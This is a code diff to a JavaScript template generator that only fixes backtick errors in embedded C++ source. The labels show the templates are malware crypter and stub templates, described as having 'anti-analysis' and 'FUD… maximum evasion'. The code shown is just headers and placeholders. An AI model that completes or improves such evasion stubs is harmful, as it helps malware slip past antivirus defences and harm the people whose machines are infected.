@@ -44,9 +44,9 @@ class TemplateGenerator {
             name: 'Basic C++ Stub',
             language: 'cpp',
             description: 'Basic C++ stub template',
-            code: `#include <iostream>`
-#include <windows.h>`
-#include <string>`
+            code: `#include <iostream>
+#include <windows.h>
+#include <string>
 
 class BasicStub {
 private:
@@ -75,12 +75,12 @@ int main() {
             name: 'Advanced C++ Stub',
             language: 'cpp',
             description: 'Advanced C++ stub with anti-analysis',
-            code: `#include <iostream>`
-#include <windows.h>`
-#include <string>`
-#include <vector>`
-#include <thread>`
-#include <chrono>`
+            code: `#include <iostream>
+#include <windows.h>
+#include <string>
+#include <vector>
+#include <thread>
+#include <chrono>
 
 class AdvancedStub {
 private:
@@ -183,13 +183,13 @@ if __name__ == "__main__":
             name: 'Basic Cryptor',
             language: 'cpp',
             description: 'Basic file cryptor template',
-            code: `#include <iostream>`
-#include <fstream>`
-#include <string>`
-#include <vector>`
-#include <cryptopp/aes.h>`
-#include <cryptopp/modes.h>`
-#include <cryptopp/filters.h>`
+            code: `#include <iostream>
+#include <fstream>
+#include <string>
+#include <vector>
+#include <cryptopp/aes.h>
+#include <cryptopp/modes.h>
+#include <cryptopp/filters.h>
 
 class BasicCryptor {
 private:
@@ -207,7 +207,7 @@ public:
         return data;
     }
     
-    std::vector<unsigned char>` decrypt(const std::vector<unsigned char>`& data) {
+    std::vector<unsigned char> decrypt(const std::vector<unsigned char>& data) {
         // Decryption logic here
         return data;
     }
@@ -306,13 +306,13 @@ int main() {
             name: 'FUD Stub Template',
             language: 'cpp',
             description: 'FUD stub with maximum evasion',
-            code: `#include <iostream>`
-#include <windows.h>`
-#include <string>`
-#include <vector>`
-#include <thread>`
-#include <chrono>`
-#include <random>`
+            code: `#include <iostream>
+#include <windows.h>
+#include <string>
+#include <vector>
+#include <thread>
+#include <chrono>
+#include <random>
 
 class FUDStub {
 private:
